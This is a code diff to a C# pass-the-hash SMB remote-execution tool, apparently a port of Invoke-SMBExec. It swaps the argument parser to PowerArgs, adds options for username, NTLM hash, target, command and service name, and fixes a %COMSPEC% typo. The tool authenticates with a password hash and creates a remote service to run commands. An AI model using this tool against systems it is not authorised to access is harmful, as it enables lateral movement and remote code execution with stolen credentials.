@@ -1,6 +1,4 @@
 ﻿using System;
-using System.Windows;
-using Mono.Options;
 using System.Threading;
 using System.Security.Cryptography;
 using System.Diagnostics;
@@ -9,34 +7,83 @@ using System.Collections.Specialized;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Collections;
+using PowerArgs;
 
-
-
-//TO Do: Make more verbose so that I know where it will error out.
-//Change Buffer.BlockCopy to CombineByteArray();
 namespace SharpInvoke_SMBExec
 {
+    public class SMBExecArgs
+    {
+        [HelpHook, ArgShortcut("-?")]
+        public bool Help { get; set; }
+
+        [ArgShortcut("-u"), ArgDescription("Username to use for authentication"), ArgRequired()]
+        public string Username { get; set; }
+
+        [ArgShortcut("-h"), ArgDescription("NTLM Password hash for authentication. This module will accept either LM:NTLM or NTLM format"), ArgRequired()]
+        public string Hash { get; set; }
+
+        [ArgShortcut("-d"), ArgDescription("Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the username")]
+        public string Domain { get; set; }
+
+        [ArgShortcut("-t"),ArgDescription("Hostname or IP Address of the target.")]
+        public string Target { get; set; }
+
+        [ArgShortcut("-c"), ArgDescription("Command to execute on the target. If a command is not specified, the function will check to see if the username and hash provide local admin access on the target")]
+        public string Command { get; set; }
+
+        [ArgShortcut("-s"),ArgDescription("Default = 20 Character Random. The Name of the service to create and delete on the target.")]
+        public string Service { get; set; }
+
+        [ArgShortcut("-cc"),ArgDescription("Default = Disabled: Prepend %COMSPEC% /C to Command"),ArgDefaultValue(false)]
+        public bool ComSpec { get; set; }
+
+        [ArgShortcut("-v1"), ArgDescription ("Force SMB1. The default behavior is to perform SMB Version negotiation and use SMB2 if it's supported by the target"), ArgDefaultValue(false)]
+        public bool SMB1 { get; set; }
+
+        [ArgShortcut("-st"),ArgDescription("Time in seconds to sleep. Change this value if you're getting weird results."), ArgDefaultValue(15)]
+        public int Sleep { get; set; }
+
+        [ArgShortcut("-dbg"),ArgDescription("Switch, Enabled debugging"), ArgDefaultValue(false)]
+        public bool Debug { get; set; }
+    }
     class Program
     {
         static void Main(string[] args)
         {
+            SMBExecArgs parsed = null;
+            try
+            {
+                parsed = Args.Parse<SMBExecArgs>(args);
+            }
+            catch (MissingArgException e)
+            {
+                Console.WriteLine("Missing Required Parameter!");
+                Environment.Exit(0);
+            }
+
+
+            if (parsed == null)
+            {
+                Environment.Exit(0);
+            }
+
             //User Set
-            string target = null;
-            string username = "";
-            string domain = "";
-            string command = "";
+            string target = parsed.Target;
+            string username = parsed.Username;
+            string domain = parsed.Domain;
+            string command = parsed.Command;
             string SMB_version = "";
-            string hash = "";
-            string service = "";
-            bool SMB1 = false;
-            bool commandCOMSPEC = false;
-            bool show_help=false;
-            int sleep = 150;
+            string hash = parsed.Hash;
+            string service = parsed.Service;
+            bool SMB1 = parsed.SMB1;
+            bool commandCOMSPEC = parsed.ComSpec;
+            bool show_help=parsed.Help;
+            int sleep = parsed.Sleep;
+            bool debugging = parsed.Debug;
 
             //Trackers
-            bool debugging = false;
+
             bool login_successful = false;
             bool SMBExec_failed = false;
             bool SMB_execute = false;            
@@ -70,35 +117,18 @@ namespace SharpInvoke_SMBExec
             OrderedDictionary packet_SMB_header = null;
             OrderedDictionary packet_SMB2_header = null;
 
-            //Parsing Command Line Arguments
-            OptionSet options = new OptionSet()
-            .Add("?:|help:", "Prints out the options.", h => show_help = true)
-            .Add("t=|target=", "Hostname or IP address of the target.", t => target = t)
-            .Add("u=|username=", "Username to use for authentication.", u => username = u)
-            .Add("d=|domain=", "Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the username.", d => domain = d)
-            .Add("h=|hash=", "NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.", h => hash = h)
-            .Add("c=|command=", "Command to execute on the target. If a command is not specified, the function will check to see if the username and hash provides local admin access on the target.", option => command = option)
-            .Add("CommandCOMPSEC:", "Default = Enabled: Prepend %COMPSEC% /C to Command", option => commandCOMSPEC = true)
-            .Add("s=|service=", "Default = 20 Character Random: Name of the service to create and delete on the target.", option => service = option)
-            .Add("SMB1:", "Switch, Force SMB1. The default behavior is to perform SMB version negotiation and use SMB2 if supported by the target.", option => SMB1=true)
-            .Add("sleep=", "Time in seconds to sleep. Change this value if you're getting weird results.", option => sleep = int.Parse(option))
-            .Add("debug:","Switch, enable debugging", option => debugging=true);
-            options.Parse(args);
-
 
             if (show_help)
             {
                 //Check for help flag, if it's there run help and exit.
-                displayHelp(null,options);
+                displayHelp(null);
                 return;
             }
             else if(string.IsNullOrEmpty(username) || string.IsNullOrEmpty(hash) || string.IsNullOrEmpty(target))
             {
-                displayHelp("Missing Required Option!", options);
-                return;
+                displayHelp("Missing Required Option!");
+                Environment.Exit(0);
             }
-
-        
 
             if (!string.IsNullOrEmpty(command))
             {
@@ -178,7 +208,7 @@ namespace SharpInvoke_SMBExec
                                 SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                 SMBClientStream.Flush();
                                 SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
-                                if (debugging == true) { Console.WriteLine("Checking if SMBClientReceive matches 'ff-53-4d-42'"); }
+                                if (debugging == true) { Console.WriteLine("Checking if SMBClientReceive matches 'fe-53-4d-42'"); }
                                 if (debugging == true) { Console.WriteLine(BitConverter.ToString(new byte[] { SMBClientReceive[4], SMBClientReceive[5], SMBClientReceive[6], SMBClientReceive[7] })); }
                                 if (BitConverter.ToString(new byte[] { SMBClientReceive[4], SMBClientReceive[5], SMBClientReceive[6], SMBClientReceive[7] }).ToLower() == "ff-53-4d-42")
                                 {
@@ -480,7 +510,7 @@ namespace SharpInvoke_SMBExec
                             var rand = new Random();
                             SMB_service = new string(Enumerable.Repeat(chars, 20).Select(s => s[rand.Next(s.Length)]).ToArray());
                             SMB_service_bytes = Encoding.Unicode.GetBytes(SMB_service);
-                        SMB_service_bytes = CombineByteArray(SMB_service_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
+                            SMB_service_bytes = CombineByteArray(SMB_service_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                         }
                         else
                         {
@@ -500,7 +530,7 @@ namespace SharpInvoke_SMBExec
 
                         if (commandCOMSPEC)
                         {
-                            command = "%COMPSEC% /C \"" + command + "\"";
+                            command = "%COMSPEC% /C \"" + command + "\"";
                         }
                         else
                         {
@@ -1982,10 +2012,9 @@ namespace SharpInvoke_SMBExec
             }
         }
 
-        public static void displayHelp(string message, OptionSet o)
+        public static void displayHelp(string message)
         {
             Console.WriteLine("{0} \r\n Usage: Sharp-InvokeWMIExec.exe -h=\"hash\" -u=\"test\\username\" -t=\"target\" -c=\"command\" ", message);
-            o.WriteOptionDescriptions(Console.Error);
             Console.ReadKey();
             Environment.Exit(-1);
         }
